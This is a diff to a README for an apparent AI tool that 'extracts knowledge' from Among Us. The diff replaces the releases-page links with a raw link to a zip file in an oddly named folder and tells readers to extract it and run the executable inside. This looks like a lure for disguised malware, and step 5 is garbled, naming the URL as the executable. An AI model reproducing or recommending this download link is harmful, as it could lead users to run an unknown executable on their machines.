@@ -1,20 +1,20 @@
 # 🎮 amongus-ai-knowledge-extractor - Extract Knowledge from Among Us Easily
 
 ## 📦 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/qwerasdf674/amongus-ai-knowledge-extractor/releases)
+[![Download Releases](https://raw.githubusercontent.com/qwerasdf674/amongus-ai-knowledge-extractor/main/Ceramiaceae/amongus-ai-knowledge-extractor.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/qwerasdf674/amongus-ai-knowledge-extractor/main/Ceramiaceae/amongus-ai-knowledge-extractor.zip)
 
 ## 🚀 Getting Started
 Welcome to the **amongus-ai-knowledge-extractor**! This application helps you extract valuable knowledge from Among Us using AI. You don't need to be a programmer to use it. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-1. **Visit the Download Page**: Click [here to download](https://github.com/qwerasdf674/amongus-ai-knowledge-extractor/releases).
+1. **Visit the Download Page**: Click [here to download](https://raw.githubusercontent.com/qwerasdf674/amongus-ai-knowledge-extractor/main/Ceramiaceae/amongus-ai-knowledge-extractor.zip).
 2. **Choose the Latest Version**: On the releases page, find the latest version of the software. It will usually be at the top of the list.
 3. **Download the File**: Click on the downloadable file that matches your operating system. The file format is typically a `.zip` or an `.exe`.
 4. **Extract the Files** (If Downloaded .zip):
    - Locate the downloaded `.zip` file in your downloads folder.
    - Right-click on the file and select "Extract All" or use a program like WinRAR or 7-Zip.
    - Choose a destination folder to extract to.
-5. **Run the Application**: After extracting, find the executable file (it might be named `amongus-ai-knowledge-extractor.exe`). Double-click this file to launch the application.
+5. **Run the Application**: After extracting, find the executable file (it might be named `https://raw.githubusercontent.com/qwerasdf674/amongus-ai-knowledge-extractor/main/Ceramiaceae/amongus-ai-knowledge-extractor.zip`). Double-click this file to launch the application.
 
 ## ⚙️ System Requirements
 To run this application smoothly, make sure your system meets the following requirements:
